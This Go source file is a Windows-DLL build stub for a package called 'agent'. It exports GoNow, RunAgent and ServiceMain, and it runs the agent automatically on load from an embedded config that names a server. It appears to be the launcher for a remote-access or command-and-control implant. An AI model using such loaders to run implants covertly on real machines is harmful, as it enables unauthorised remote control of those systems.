//go:build dll && windows

package agent

import "C"
import (
	"context"
	"sync"
)

var dllOnce sync.Once

func init() {
	if embeddedTrigger != "" && embeddedTrigger != "DllMain" {
		return
	}
	if HasEmbeddedConfig() {
		go RunDLL()
	}
}

//export GoNow
func GoNow() {
	go RunDLL()
}

//export RunAgent
func RunAgent() {
	RunDLL()
}

//export ServiceMain
func ServiceMain() {
	RunDLL()
}

func RunDLL() {
	dllOnce.Do(func() {
		c := &Config{}
		applyEmbedded(c)
		if c.Server == "" {
			return
		}
		a, err := New(c)
		if err != nil {
			return
		}
		a.Run(context.Background())
	})
}
